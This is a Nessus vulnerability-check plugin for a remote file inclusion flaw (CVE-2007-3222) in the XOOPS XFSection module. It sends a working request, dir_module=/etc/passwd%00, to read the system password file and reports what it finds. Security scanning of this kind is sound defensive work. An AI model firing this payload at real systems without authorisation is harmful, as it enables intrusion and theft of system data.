#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(25493);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2007-3222");
  script_bugtraq_id(24465);
  script_osvdb_id(36815);
  script_xref(name:"EDB-ID", value:"4068");

  script_name(english:"XOOPS XFSection Module modify.php dir_module Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file with XFSection's modify.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running XFSection, a third-party module for XOOPS. 

The version of this module installed on the remote host fails to
sanitize input to the 'dir_module' parameter of the 'modify.php'
script before using it to include PHP code.  Regardless of PHP's
'register_globals' setting, an unauthenticated attacker can exploit
this issue to view arbitrary files on the remote host or possibly to
execute arbitrary PHP code, perhaps from third-party hosts." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2007/06/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/06/13");
 script_cvs_date("$Date: 2016/05/19 18:10:51 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("xoops_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/xoops");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/xoops"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  #
  # nb: the exploit requires magic_quotes_gpc to be disabled; if it's
  #     not, allow_url_fopen might still allow an attack to work but
  #     we can't test for it without accessing a remote site.
  file = "/etc/passwd";
  u = string(
      dir, "/modules/xfsection/modify.php?",
      "dir_module=", file, "%00"
    );
  r = http_send_recv3(port:port, method: "GET", item: u);
  if (isnull(r)) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:r[2]))
  {
    contents = r[2];
    contents = contents - strstr(contents, "<html>");

    if (contents)
    {
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus was\n",
        "able to read from the remote host :\n",
        "\n",
        contents
      );
    }
    else report = NULL;

    security_hole(port:port, extra: report);
    exit(0);
  }
}
